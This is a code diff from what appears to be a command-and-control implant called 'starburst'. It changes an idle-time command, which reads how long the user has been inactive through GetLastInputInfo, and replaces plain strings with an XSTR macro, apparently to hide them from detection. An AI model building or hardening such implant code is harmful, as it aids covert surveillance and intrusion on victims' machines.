@@ -31,7 +31,7 @@ auto declfn starburst::cmd_idletime(
     auto h_user32 = inst.kernel32.LoadLibraryA( _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
+            XSTR( "failed to load user32.dll" ) );
         return;
     }
 
@@ -41,7 +41,7 @@ auto declfn starburst::cmd_idletime(
 
     if ( !pGetLastInputInfo ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve GetLastInputInfo" ) ) );
+            XSTR( "failed to resolve GetLastInputInfo" ) );
         return;
     }
 
@@ -50,7 +50,7 @@ auto declfn starburst::cmd_idletime(
 
     if ( !pGetLastInputInfo( &lii ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetLastInputInfo failed" ) ) );
+            XSTR( "GetLastInputInfo failed" ) );
         return;
     }
 
@@ -66,25 +66,25 @@ auto declfn starburst::cmd_idletime(
     uint32_t off = 0;
     char num[16];
 
-    str_copy( output, symbol<char*>( const_cast<char*>( "User idle: " ) ) );
+    str_copy( output, XSTR( "User idle: " ) );
     off = str_len( output );
 
     int_to_str( num, hours, 10 );
     memory::copy( output + off, num, str_len( num ) );
     off += str_len( num );
-    str_copy( output + off, symbol<char*>( const_cast<char*>( " hours, " ) ) );
+    str_copy( output + off, XSTR( " hours, " ) );
     off += 8;
 
     int_to_str( num, minutes, 10 );
     memory::copy( output + off, num, str_len( num ) );
     off += str_len( num );
-    str_copy( output + off, symbol<char*>( const_cast<char*>( " minutes, " ) ) );
+    str_copy( output + off, XSTR( " minutes, " ) );
     off += 10;
 
     int_to_str( num, seconds, 10 );
     memory::copy( output + off, num, str_len( num ) );
     off += str_len( num );
-    str_copy( output + off, symbol<char*>( const_cast<char*>( " seconds" ) ) );
+    str_copy( output + off, XSTR( " seconds" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
 }
